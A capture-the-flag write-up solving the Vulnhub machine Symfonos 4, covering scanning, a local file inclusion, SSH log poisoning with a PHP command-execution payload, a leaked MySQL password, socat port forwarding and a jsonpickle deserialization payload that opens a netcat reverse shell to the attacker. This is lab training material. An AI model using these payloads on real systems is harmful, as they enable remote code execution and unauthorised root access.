---
title:     "Vulnhub - Symfonos 4"
tags: [medium,port_forward,log-poisoning,mysql]
---

Today, We are going to pwn Symfonos 4 by Zayotic from Vulnhub

## Description:

```
OSCP-like Intermediate real life based machine designed to teach people the importance of trying harder.
```
Download Link : <https://www.vulnhub.com/entry/symfonos-4,347/>

Lets Begin with our Initial Scan

## Nmap Scan Results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)
|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)
|_  256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:8C:D3:8B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```

## HTTP:

Normal webpage with an image like always.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/1.png)

Since there is no other interesting Ports Open, I started Gobuster on the webpage.

Gobuster Results:
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.136
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html
[+] Timeout:        10s
===============================================================
2020/03/12 19:39:13 Starting gobuster
===============================================================
/index.html (Status: 200)
/css (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/sea.php (Status: 302)
/atlantis.php (Status: 200)
/server-status (Status: 403)
/gods (Status: 301)
===============================================================
2020/03/12 19:41:23 Finished
===============================================================
```

``/gods``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/2.png)

Downloaded all log files to my machine.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/3.png)

``hades.log``

>Hades was the god of the underworld and the name eventually came to also describe the home of the dead as well. He was the oldest male child of Cronus and Rhea. Hades and his brothers Zeus and Poseidon defeated their father and the Titans to end their reign, claiming rulership over the cosmos.

``poseidon.log``

>Poseidon was the god of the sea, earthquakes and horses. Although he was officially one of the supreme gods of Mount Olympus, he spent most of his time in his watery domain. Poseidon was brother to Zeus and Hades. These three gods divided up creation.

``zeus.log``

>Zeus is the god of the sky, lightning and thunder in Ancient Greek religion and myth, and king of the gods on Mount Olympus. Zeus is the sixth child of Kronos and Rhea, king and queen of the Titans.

``/atlantis.php``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/4.png)

``/sea.php``

Whenever I open ``/sea.php`` it redirects to ``/atlantis.php``. Lets capture the request in burp.

``302 Found`` which is redirection, We can stop a redirection using burp.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/5.png)

All we need to do is change ``302 Found`` to ``200 Ok`` For that open ``Proxy -> Options -> Match and Replace``.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/6.png)

Now If I visit ``/sea.php`` it displays a new page.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/7.png)

So If I select a GOD the url changes to ``/sea.php?file=hades`` maybe Local File Inclusion.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/8.png)

But I can't view ``/etc/passwd`` so I searched for any log files and I got ``/var/log/auth`` We dont need to represent ``.log`` because we already saw those ``poseidon.log, zeus.log and hades.log`` in ``/gods`` with extension but in ``/sea.php`` it shows the same file even without the extensions.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/9.png)

When seeing those Log files it shows ``OpenSSH`` so we can do ``SSH Log Poisoning``

Reference :
>https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/

```ssh '<?php system($_GET['c']); ?>'@192.168.1.136```

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/10.png)

Now its injected, Time to get reverse shell.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/11.png)

When checking ``/var/www/html/atlantis.php`` found ``mysql`` credentials.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/12.png)

``root : yVzyRGw3cG2Uyt2r``

I logged with those and got admin hash.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/13.png)

MySql Commands 
> http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm

I tried cracking the hash but I can't. So I skipped that and started looking for other things.

I started looking around in the directories and found ``/opt/code`` I found a python code. I came to know its ``jsonpickle`` so it may be running on the background.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/55.png)

Uploaded My Enumeration Script and Found this 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/14.png)

> - Port 3306 - MySQL
> - Port 8080 - Webpage (Maybe)

We can’t see port ``8080`` directly so We need to do [Port Forward](https://en.wikipedia.org/wiki/Port_forwarding) by doing this we can access the webpage from our machine.

I used ``socat`` method for port forwarding. We can also use ``SSH`` interactive shell for port forwarding too.
>https://www.cyberciti.biz/faq/linux-unix-tcp-port-forwarding/

>socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/15.png)

Now I can visit ``http://192.168.1.136:8081``, It displays this page 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/16.png)

When I click the Main page it directs to 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/17.png)

But ``192.168.1.136:8081/whoami`` is suspecious, So I intercept the request in Burp 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/18.png)

``username`` looks like base64encoded so I decoded that 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/19.png)

So this is the thing we saw in ``/opt/code``

Later I found this [article](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)

So I did some changes in the string and encoded this to base64.

> {"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["/usr/bin/nc -e /bin/bash 192.168.1.103 1234"]}, null, null, null]}

Gave that base64 encoded to ``username`` and started my Listener and got shell.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/20.png)

I'm Root!!

!![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/symfonos4/21.png)